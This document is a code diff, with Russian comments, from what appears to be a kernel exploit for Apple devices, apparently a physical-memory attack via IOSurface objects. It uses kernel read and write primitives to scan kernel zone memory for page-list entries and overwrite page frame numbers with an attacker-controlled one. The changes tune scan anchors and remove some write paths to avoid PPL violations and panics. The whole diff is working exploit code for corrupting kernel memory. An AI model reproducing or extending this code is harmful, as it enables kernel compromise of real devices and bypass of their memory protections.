@@ -6308,13 +6308,17 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
             uint64_t q = saQ[i];
             if (!((uint32_t)q == pfn32 && ((uint32_t)(q >> 32) == 0 || (uint32_t)(q >> 32) == 4))) continue;
             uint64_t pd244 = kpLooksLikeKernelPointer(surfVA) ? kp_untag_ptr(early_kread64(surfVA + 0x30)) : 0;
+            uint64_t ro244 = kpLooksLikeKernelPointer(surfVA) ? kp_untag_ptr(early_kread64(surfVA + 0x178)) : 0;
             // 1.9.245: per-anchor окна ±32MB, НЕ min..max спан — rangeObj-якорь живёт
             // в VM-полосе 0xffffffdc… и раздувал спан до ~3TB (26 минут скана =
             // окно мины, паника 063308). planeDesc первым: page-list рядом с MD в GEN3.
-            uint64_t anch[2] = { pd244, surfVA };
+            // 1.9.246: ro244 возвращён третьим якорем — page-list массив это
+            // kalloc_large → VM-субдиапазон зоны, сосед rangeObj (в 635-м ±32MB
+            // вокруг pd244/surfVA промахнулись, VM-полоса не сканировалась).
+            uint64_t anch[3] = { pd244, ro244, surfVA };
             uint64_t zva = 0;
-            uint32_t pgBudget = 10240;
-            for (int a = 0; a < 2 && !zva && pgBudget; a++) {
+            uint32_t pgBudget = 15360;
+            for (int a = 0; a < 3 && !zva && pgBudget; a++) {
                 if (!kpLooksLikeKernelPointer(anch[a])) continue;
                 uint64_t abase = anch[a] & ~0x3fffULL;
                 uint64_t lo = abase - 0x2000000ULL, hi = abase + 0x2000000ULL;
@@ -6391,44 +6395,12 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                             if (nv >= kconstant(base) && nv < kconstant(base) + 0x6000000ULL) vtNear = YES;
                         }
                         if (!vtNear) {
-                            // 1.9.243: physmap-запись = паника на physmap-RO (1.9.220,
-                            // ребут 242) — патчим ТОЛЬКО через zone-VA: zone-скан
-                            // значения хита в окне вокруг IOSurface-объектов (P6,
-                            // безопасно). Не нашёлся → хит пропущен, physmap не трогаем.
-                            uint64_t pd243 = kpLooksLikeKernelPointer(surfVA) ? kp_untag_ptr(early_kread64(surfVA + 0x30)) : 0;
-                            uint64_t ro243 = kpLooksLikeKernelPointer(surfVA) ? kp_untag_ptr(early_kread64(surfVA + 0x178)) : 0;
-                            uint64_t anch[3] = { surfVA, pd243, ro243 };
-                            uint64_t mnZ = ~0ULL, mxZ = 0, zva = 0;
-                            for (int a = 0; a < 3; a++) if (kpLooksLikeKernelPointer(anch[a])) { if (anch[a] < mnZ) mnZ = anch[a]; if (anch[a] > mxZ) mxZ = anch[a]; }
-                            if (mnZ != ~0ULL) {
-                                uint64_t lo = (mnZ & ~0x3fffULL) - 0x2000000ULL, hi = (mxZ & ~0x3fffULL) + 0x2000000ULL;
-                                for (uint64_t pg = lo; pg < hi && !zva; pg += 0x4000) {
-                                    if (!kpSafeToRead(pg)) continue;
-                                    uint64_t ppa = kvtophys(pg);
-                                    int pft = ppa ? kpFrameTypeOf(ppa) : -1;
-                                    if (!(pft == 0x21 || pft == 0x6 || pft == 0xc)) continue;
-                                    uint8_t zbuf[0x4000];
-                                    kreadbuf(pg, zbuf, sizeof(zbuf));
-                                    for (uint32_t zo = 0; zo + 8 <= sizeof(zbuf) && !zva; zo += 8) {
-                                        uint64_t zq = 0; memcpy(&zq, zbuf + zo, 8);
-                                        if (zq != q) continue;
-                                        if (pg + zo == kva + o) continue;   // physmap-алиас сам себя
-                                        zva = pg + zo;
-                                    }
-                                }
-                            }
-                            if (!zva) {
-                                kpNote(r, [NSString stringWithFormat:@"  [DEP] page-0 pfn32(hi=%u) @ physmap %#llx — zone-VA НЕ найден, хит пропущен (устройство живо, яд не вписан)", (uint32_t)(q >> 32), (unsigned long long)(kva + o)]);
-                                hitForm[nDep] = -1; nDep++;
-                                continue;
-                            }
-                            kpNote(r, [NSString stringWithFormat:@"  [DEP] ★ page-0 запись pfn32(hi=%u) zone-VA %#llx → ctlPFN %#x",
-                                      (uint32_t)(q >> 32), (unsigned long long)zva, ctlPFN]);
-                            usleep(1500);
-                            early_kwrite64(zva, (q & 0xffffffff00000000ULL) | ctlPFN);
-                            uint64_t rb = early_kread64(zva);
-                            kpNote(r, [NSString stringWithFormat:@"      readback: %#018llx — %@", (unsigned long long)rb, (uint32_t)rb == ctlPFN ? @"ПРИЛИПЛО" : @"МИМО"]);
-                            hitAddr[nDep] = zva; hitOld[nDep] = q; hitForm[nDep] = 2; nDep++;
+                            // 1.9.246: zone-поиск в DEP-цикле УБРАН насовсем — walker
+                            // уходил в deadly-регионы (census 0xb = последний тип перед
+                            // тихим ресетом 635-го, паник-лога нет) и имел 3TB-спан.
+                            // Сигнатурный хит = только диагностика. Патч-пути: EARLY
+                            // (bounded per-anchor) и spec+0x58 (объектные цепочки).
+                            kpNote(r, [NSString stringWithFormat:@"  [DEP] сигнатура pfn32(hi=%u) @ %#llx — диагностика, яд не вписан (1.9.246)", (uint32_t)(q >> 32), (unsigned long long)(kva + o)]);
                             continue;
                         }
                     }
@@ -6448,45 +6420,10 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                             if (rr >= 4) { run = rr; dir = tryDir; }
                         }
                         if (run >= 4) {
-                            kpNote(r, [NSString stringWithFormat:@"  [DEP] ★★ PAGE-LIST: серия %u pfn (%s) @ %#llx+%#x — патчим page-0 (lo==pfn32) на ctlPFN %#x",
-                                      run, dir > 0 ? "asc" : "desc", (unsigned long long)kva, o, ctlPFN]);
-                            // 1.9.243: запись ТОЛЬКО через zone-VA (physmap-RO = паника).
-                            // Для page-0 записи серии ищем её zone-VA значением в окне.
-                            for (uint32_t ri = 0; ri < run; ri++) {
-                                uint64_t qn = 0; memcpy(&qn, pbuf2 + o + (uint64_t)ri * 8, 8);
-                                if ((uint32_t)qn != pfn32) continue;
-                                uint64_t pd243 = kpLooksLikeKernelPointer(surfVA) ? kp_untag_ptr(early_kread64(surfVA + 0x30)) : 0;
-                                uint64_t ro243 = kpLooksLikeKernelPointer(surfVA) ? kp_untag_ptr(early_kread64(surfVA + 0x178)) : 0;
-                                uint64_t anch[3] = { surfVA, pd243, ro243 };
-                                uint64_t mnZ = ~0ULL, mxZ = 0, zva = 0;
-                                for (int a = 0; a < 3; a++) if (kpLooksLikeKernelPointer(anch[a])) { if (anch[a] < mnZ) mnZ = anch[a]; if (anch[a] > mxZ) mxZ = anch[a]; }
-                                if (mnZ != ~0ULL) {
-                                    uint64_t lo = (mnZ & ~0x3fffULL) - 0x2000000ULL, hi = (mxZ & ~0x3fffULL) + 0x2000000ULL;
-                                    for (uint64_t pg = lo; pg < hi && !zva; pg += 0x4000) {
-                                        if (!kpSafeToRead(pg)) continue;
-                                        uint64_t ppa = kvtophys(pg);
-                                        int pft = ppa ? kpFrameTypeOf(ppa) : -1;
-                                        if (!(pft == 0x21 || pft == 0x6 || pft == 0xc)) continue;
-                                        uint8_t zbuf[0x4000];
-                                        kreadbuf(pg, zbuf, sizeof(zbuf));
-                                        for (uint32_t zo = 0; zo + 8 <= sizeof(zbuf) && !zva; zo += 8) {
-                                            uint64_t zq = 0; memcpy(&zq, zbuf + zo, 8);
-                                            if (zq != qn) continue;
-                                            if (pg + zo == kva + o + (uint64_t)ri * 8) continue;
-                                            zva = pg + zo;
-                                        }
-                                    }
-                                }
-                                if (!zva) {
-                                    kpNote(r, [NSString stringWithFormat:@"      page-0 записи серии zone-VA НЕ найден — пропуск (устройство живо)"]);
-                                    continue;
-                                }
-                                usleep(1500);
-                                early_kwrite64(zva, (qn & 0xffffffff00000000ULL) | ctlPFN);
-                                uint64_t rb = early_kread64(zva);
-                                kpNote(r, [NSString stringWithFormat:@"      readback[%u] zone-VA %#llx: %#018llx — %@", ri, (unsigned long long)zva, (unsigned long long)rb, (uint32_t)rb == ctlPFN ? @"ПРИЛИПЛО" : @"МИМО"]);
-                                hitAddr[nDep] = zva; hitOld[nDep] = qn; hitForm[nDep] = 2; nDep++;
-                            }
+                            // 1.9.246: серия = только диагностика (zone-поиск убран —
+                            // см. выше, тихий ресет 635-го).
+                            kpNote(r, [NSString stringWithFormat:@"  [DEP] ★★ PAGE-LIST: серия %u pfn (%s) @ %#llx+%#x — диагностика, яд не вписан (1.9.246)",
+                                      run, dir > 0 ? "asc" : "desc", (unsigned long long)kva, o]);
                             continue;
                         }
                     }
@@ -6520,8 +6457,9 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
         // совпадает и в ЧУЖИХ страницах (pmap/pv/PT-структуры хранят PA-значения),
         // патч не туда = PPL-нарушение = тихий ресет (1.9.223 ×2, 1.9.229). Скан
         // остаётся диагностикой, записей ноль. Основной путь — OPC-цепь (оффсеты,
-        // безопасные zone-чтения, без охоты по значениям). Хиты НЕ патчим:
-        for (int i = 0; i < nDep; i++) hitForm[i] = -1;
+        // безопасные zone-чтения, без охоты по значениям). Хиты НЕ патчим.
+        // 1.9.246: нуллификатор ЩАДИТ форму 5 — EARLY-хиты живут в retry и restore.
+        for (int i = 0; i < nDep; i++) if (hitForm[i] != 5) hitForm[i] = -1;
     }
     // 1.9.198: VA-FIELD DEPUTY — 1.9.197 доказал: prepare считает PA = vtophys
     // (kernel VA буфера) на лету (слот откатился в ОРИГИНАЛ при пропатченных
